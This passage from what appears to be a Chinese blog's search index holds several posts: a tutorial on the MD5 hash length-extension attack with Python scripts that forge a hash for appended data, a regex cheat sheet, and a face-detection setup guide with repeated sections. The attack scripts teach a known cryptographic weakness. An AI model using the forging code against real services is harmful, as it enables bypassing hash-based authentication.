$b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 我们脑补一下程序计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 的MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:3:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#我们脑补一下程序计算str的过程"},{"categories":["cryptography"],"content":"四、代码实现 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:4:0","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#四代码实现"},{"categories":["cryptography"],"content":"my_md5.py #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author：DshtAnger # theory reference: # blog： # http://blog.csdn.net/adidala/article/details/28677393 # http://blog.csdn.net/forgotaboutgirl/article/details/7258109 # http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html # RFC1321： # https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf ############################################################################## import sys def genMsgLengthDescriptor(msg_bitsLenth): ''' ---args: msg_bitsLenth : the bits length of raw message --return: 16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding ''' return __import__(\"struct\").pack(\"\u003eQ\",msg_bitsLenth).encode(\"hex\") def reverse_hex_8bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 16 , i.e.8bytes --return: transform raw message descriptor to little-endian ''' hex_str = \"%016x\"%int(hex_str,16) assert len(hex_str)==16 return __import__(\"struct\").pack(\"\u003cQ\",int(hex_str,16)).encode(\"hex\") def reverse_hex_4bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 8 , i.e.4bytes --return: transform 4 bytes message block to little-endian ''' hex_str = \"%08x\"%int(hex_str,16) assert len(hex_str)==8 return __import__(\"struct\").pack(\"\u003cL\",int(hex_str,16)).encode(\"hex\") def deal_rawInputMsg(input_msg): ''' --args: input_msg : inputed a ascii-encoded string --return: a hex-encoded string which can be inputed to mathematical transformation function. ''' ascii_list = [x.encode(\"hex\") for x in input_msg] length_msg_bytes = len(ascii_list) length_msg_bits = len(ascii_list)*8 #padding ascii_list.append('80') while (len(ascii_list)*8+64)%512 != 0: ascii_list.append('00') #add Descriptor ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits))) return \"\".join(ascii_list) def getM16(hex_str,operatingBlockNum): ''' --args: hex_str : a hex-encoded string with length in integral multiple of 512bits operatingBlockNum : message block number which is being operated , greater than 1 --return: M : result of splited 64bytes into 4*16 message blocks with little-endian ''' M = [int(reverse_hex_4bytes(hex_str[i:(i+8)]),16) for i in xrange(128*(operatingBlockNum-1),128*operatingBlockNum,8)] return M #定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要\u00260xffffffff操作。注意返回的是十进制的数 def T(i): result = (int(4294967296*abs(__import__(\"math\").sin(i))))\u00260xffffffff return result #定义每轮中用到的函数 #RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位 F = lambda x,y,z:((x\u0026y)|((~x)\u0026z)) G = lambda x,y,z:((x\u0026z)|(y\u0026(~z))) H = lambda x,y,z:(x^y^z) I = lambda x,y,z:(y^(x|(~z))) RL = L = lambda x,n:(((x\u003c\u003cn)|(x\u003e\u003e(32-n)))\u0026(0xffffffff)) def FF(a, b, c, d, x, s, ac): a = (a+F ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def GG(a, b, c, d, x, s, ac): a = (a+G ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def HH(a, b, c, d, x, s, ac): a = (a+H ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def II(a, b, c, d, x, s, ac): a = (a+I ((b), (c), (d)) + (x) + (ac)\u00260xffffffff)\u00260xffffffff; a = RL ((a), (s))\u00260xffffffff; a = (a+b)\u00260xffffffff return a def show_md5(A,B,C,D): return \"\".join( [ \"\".join(__import__(\"re\").findall(r\"..\",\"%08x\"%i)[::-1]) for i in (A,B,C,D) ] ) def run_md5(A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476,readyMsg=\"\"): a = A b = B c = C d = D for i in xrange(0,len(readyMsg)/128): M = getM16(readyMsg,i+1) for i in xrange(16): exec \"M\"+str(i)+\"=M[\"+str(i)+\"]\" #First round a=FF(a,b,c,d,M0,7,0xd76aa478L) d=FF(d,a,b,c,M1,12,0xe8c7b756L) c=FF(c,d,a,b,M2,17,0x242070dbL) b=FF(b,c,d,a,M3,22,0xc1bdceeeL) a=FF(a,b,c,d,M4,7,0xf57c0fafL) d=FF(d,a,b,c,M5,12,0x4787c62aL) c=FF(c,d,a,b,M6,17,0xa8304613L) b=FF(b,c,d,a,M7,22,0xfd469501L) a=FF(a,b,c,d,M8,7,0x698098d8L) d=FF(d,a,b,c,M9,12,0x8b44f7afL) c=FF(c,d,a,b,M10,17,0xffff5bb1L) b=FF(b,c,d,a,M11,22,0x895cd7be","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:4:1","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#my_md5py"},{"categories":["cryptography"],"content":"test.py # -*- coding: utf-8 -*- import my_md5 import sys import six MD5_Hash=sys.argv[1] length=int(sys.argv[2]) text=sys.argv[3] s1=eval('0x'+MD5_Hash[:8].decode('hex')[::-1].encode('hex')) s2=eval('0x'+MD5_Hash[8:16].decode('hex')[::-1].encode('hex')) s3=eval('0x'+MD5_Hash[16:24].decode('hex')[::-1].encode('hex')) s4=eval('0x'+MD5_Hash[24:32].decode('hex')[::-1].encode('hex')) secret = \"a\"*length test=secret+'\\x80'+'\\x00'*((512-length*8-8-8*8)/8)+six.int2byte(length*8)+'\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+text s = my_md5.deal_rawInputMsg(test) r = my_md5.deal_rawInputMsg(secret) inp = s[len(r):] print '填充完的数据为:'+test+'\\n' print '----------------------------------------------------------' print '扩充完的数据为(16进制):'+s print '----------------------------------------------------------' print '截取最后分组的数据(16进制):'+inp print '----------------------------------------------------------' print '最终填充结果为:'+bytes(test).encode('hex') print \"填充后的md5为:\"+my_md5.run_md5(s1,s2,s3,s4,inp) 脚本使用时第一个命令行参数是一个服务端加密一个固定长度数据的md5，第二个参数是固定的长度 例如已知服务端加密一个15字符的md5：test.py 571580b26c65f306376d4f64e53cb5c7 15 参考文章 MD5的Hash长度扩展攻击 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:4:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#testpy"},{"categories":["cryptography"],"content":"test.py # -*- coding: utf-8 -*- import my_md5 import sys import six MD5_Hash=sys.argv[1] length=int(sys.argv[2]) text=sys.argv[3] s1=eval('0x'+MD5_Hash[:8].decode('hex')[::-1].encode('hex')) s2=eval('0x'+MD5_Hash[8:16].decode('hex')[::-1].encode('hex')) s3=eval('0x'+MD5_Hash[16:24].decode('hex')[::-1].encode('hex')) s4=eval('0x'+MD5_Hash[24:32].decode('hex')[::-1].encode('hex')) secret = \"a\"*length test=secret+'\\x80'+'\\x00'*((512-length*8-8-8*8)/8)+six.int2byte(length*8)+'\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+text s = my_md5.deal_rawInputMsg(test) r = my_md5.deal_rawInputMsg(secret) inp = s[len(r):] print '填充完的数据为:'+test+'\\n' print '----------------------------------------------------------' print '扩充完的数据为(16进制):'+s print '----------------------------------------------------------' print '截取最后分组的数据(16进制):'+inp print '----------------------------------------------------------' print '最终填充结果为:'+bytes(test).encode('hex') print \"填充后的md5为:\"+my_md5.run_md5(s1,s2,s3,s4,inp) 脚本使用时第一个命令行参数是一个服务端加密一个固定长度数据的md5，第二个参数是固定的长度 例如已知服务端加密一个15字符的md5：test.py 571580b26c65f306376d4f64e53cb5c7 15 参考文章 MD5的Hash长度扩展攻击 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:4:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#参考文章"},{"categories":["coding"],"content":"这里做一个笔记，整理了各大网站里关于正则表达式的知识，以备后面查询。 主要涉及两个方面： 正则表达式书写规则 常用正则表达式 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/learn/simple-regular-expression-use/:0:0","series":null,"tags":["正则"],"title":"简单正则表达式使用","uri":"https://zu1k.com/posts/learn/simple-regular-expression-use/#"},{"categories":["coding"],"content":"正则表达式简单用法 常用元字符 代码 说明 . 匹配除换行符以外的任意字符 \\w 匹配字母或数字或下划线 \\s 匹配任意的空白符 \\d 匹配数字 \\b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 常用限定符 代码/语法 说明 * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 常用反义词 代码/语法 说明 \\W 匹配任意不是字母，数字，下划线，汉字的字符 \\S 匹配任意不是空白符的字符 \\D 匹配任意非数字的字符 \\B 匹配不是单词开头或结束的位置 [^x] 匹配除了x以外的任意字符 [^aeiou] 匹配除了aeiou这几个字母以外的任意字符 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/learn/simple-regular-expression-use/:1:0","series":null,"tags":["正则"],"title":"简单正则表达式使用","uri":"https://zu1k.com/posts/learn/simple-regular-expression-use/#正则表达式简单用法"},{"categories":["coding"],"content":"正则表达式学习网站 正则表达式在线测试-站长工具 正则表达式在线测试-菜鸟工具 正则表达式教程-菜鸟教程 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/learn/simple-regular-expression-use/:2:0","series":null,"tags":["正则"],"title":"简单正则表达式使用","uri":"https://zu1k.com/posts/learn/simple-regular-expression-use/#正则表达式学习网站"},{"categories":["coding"],"content":"这里我们将要介绍如何使用python进行简单的人脸检测与人脸识别，并且通过gpu来加速。 注意：这里都是基础内容，如果需要更加强大深入的请出门左转。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:0:0","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#"},{"categories":["coding"],"content":"一、环境搭建与资源下载 下面介绍简单人脸检测与识别需要使用到的几个重要依赖。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:0","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#一环境搭建与资源下载"},{"categories":["coding"],"content":"基础环境 我所使用的环境是windows 10 + python3.6(64位) ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:1","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#基础环境"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#python库"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#1-python扩展程序集numpyhttpswwwlfduciedugohlkepythonlibsnumpy"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#2-计算机视觉库opencvhttpswwwlfduciedugohlkepythonlibsopencv"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#3-机器学习c算法库dlibhttpspypiorgsimpledlib"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#4-人脸识别集成库face_recognitionhttpsgithubcomageitgeyface_recognition"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#5-深度学习库kerashttpskerasio"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:2","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#6-机器学习框架tensorflowhttpswwwtensorfloworghlzh-cn"},{"categories":["coding"],"content":"人脸识别用到的数据模型 基于目前的数据量和个人知识与能力，我还不能自己利用机器学习来训练数据模型，所以使用的是国外别人已经训练好的数据模型。 1. OpenCV使用到的人脸分类模型xml：haarcascades 上面链接中所有的xml都推荐下载到本地备用，我所使用的是haarcascade_frontalface_default.xml 2. Dlib使用到的人脸识别训练模型：shape_predictor 我所使用的是shape_predictor_68_face_landmarks.dat.bz2和shape_predictor_5_face_landmarks.dat.bz2这两个。 推荐大家把这两个都下载下来，并解压，我们所需要的是里面的dat数据文件。 好了，有了上面的这些基础环境与依赖，我们可以继续我们接下来的简单人脸检测与识别了。 没有装好这些环境的同学请注意了，我们班级已经与谷歌、百度等大公司达成合作，有任何问题请在Google和Baidu进行搜索，他们会提供你所需要的答案。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#人脸识别用到的数据模型"},{"categories":["coding"],"content":"人脸识别用到的数据模型 基于目前的数据量和个人知识与能力，我还不能自己利用机器学习来训练数据模型，所以使用的是国外别人已经训练好的数据模型。 1. OpenCV使用到的人脸分类模型xml：haarcascades 上面链接中所有的xml都推荐下载到本地备用，我所使用的是haarcascade_frontalface_default.xml 2. Dlib使用到的人脸识别训练模型：shape_predictor 我所使用的是shape_predictor_68_face_landmarks.dat.bz2和shape_predictor_5_face_landmarks.dat.bz2这两个。 推荐大家把这两个都下载下来，并解压，我们所需要的是里面的dat数据文件。 好了，有了上面的这些基础环境与依赖，我们可以继续我们接下来的简单人脸检测与识别了。 没有装好这些环境的同学请注意了，我们班级已经与谷歌、百度等大公司达成合作，有任何问题请在Google和Baidu进行搜索，他们会提供你所需要的答案。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#1-opencv使用到的人脸分类模型xmlhaarcascadeshttpsgithubcomopencvopencvtreemasterdatahaarcascades"},{"categories":["coding"],"content":"人脸识别用到的数据模型 基于目前的数据量和个人知识与能力，我还不能自己利用机器学习来训练数据模型，所以使用的是国外别人已经训练好的数据模型。 1. OpenCV使用到的人脸分类模型xml：haarcascades 上面链接中所有的xml都推荐下载到本地备用，我所使用的是haarcascade_frontalface_default.xml 2. Dlib使用到的人脸识别训练模型：shape_predictor 我所使用的是shape_predictor_68_face_landmarks.dat.bz2和shape_predictor_5_face_landmarks.dat.bz2这两个。 推荐大家把这两个都下载下来，并解压，我们所需要的是里面的dat数据文件。 好了，有了上面的这些基础环境与依赖，我们可以继续我们接下来的简单人脸检测与识别了。 没有装好这些环境的同学请注意了，我们班级已经与谷歌、百度等大公司达成合作，有任何问题请在Google和Baidu进行搜索，他们会提供你所需要的答案。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:1:3","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#2-dlib使用到的人脸识别训练模型shape_predictorhttpdlibnetfiles"},{"categories":["coding"],"content":"二、简单人脸检测 在这一节不会讲解复杂的人脸识别，只是先通过简单的小例子让大家先了解一下人脸识别需要用到什么、人脸识别的基本步骤等等最简单的内容。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:0","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#二简单人脸检测"},{"categories":["coding"],"content":"1. 利用OpenCV进行图片人脸检测并进行标注 实现思路 先将图片灰度化，为了降低图片颜色维度，减少后续识别计算量 然后利用OpenCV加载别人训练好的人脸分类器，通过这个分类器来检测人脸 在原图片上画一个矩形，然后显示出来 实现代码 import cv2 filepath = \"img/sdu/6.jpg\" classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) img = cv2.imread(filepath) # 读取图片 gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # 灰度化 color = (0, 255, 0) # 定义绘制颜色 # 调用识别人脸 faceRects = classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) if len(faceRects): # 大于0则检测到人脸 for faceRect in faceRects: # 单独框出每一张人脸 x, y, w, h = faceRect # 框出人脸 cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/:2:1","series":null,"tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://zu1k.com/posts/tutorials/ai/face-detection-and-recognition-basic-tutorial/#1-利用opencv进行图片人脸检测并进行标注"},{"categories":["coding"],"content":"1. 利用OpenCV进行图片人脸检测并进行标注 实现思路 先将图片灰度化，为了降低图片颜色维度，减少后续识别计算量 然后利用OpenCV加载别人训练好的人脸分类器，通过这个分类器来检测人脸 在原图片上画一个矩形，然后显示出来 实现代码 import cv2 filepath = \"img/sdu/6.jpg\" classifier = cv2.CascadeClassifier( 